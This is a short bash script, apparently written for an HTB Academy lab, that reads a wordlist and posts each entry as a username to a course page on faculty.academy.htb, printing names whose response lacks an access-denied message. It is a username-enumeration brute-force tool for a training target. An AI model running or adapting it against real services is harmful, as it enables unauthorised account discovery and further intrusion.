#!/bin/bash

while getopts ":w:" opt; do
  case $opt in
    w) PARAM="$OPTARG"
    ;;
    \?) echo "Invalid option -$OPTARG" >&2
    ;;
  esac
done

if [ -z "$PARAM" ]; then
  echo "Usage: ./curl.sh -w [wordlist location]"
  exit 1
fi

GREEN='\033[0;32m'
NC='\033[0m' # No Color

while IFS= read -r line; do
    response=$(curl -s "http://faculty.academy.htb:44794/courses/linux-security.php7" -X POST -d "username=$line" -H 'Content-Type: application/x-www-form-urlencoded' 2>&1)
    if ! echo "$response" | grep -q "This user does not have access!"; then
        echo -e "Username: ${GREEN}$line${NC}"
        echo "Response: $response"
    fi
done < "$PARAM"
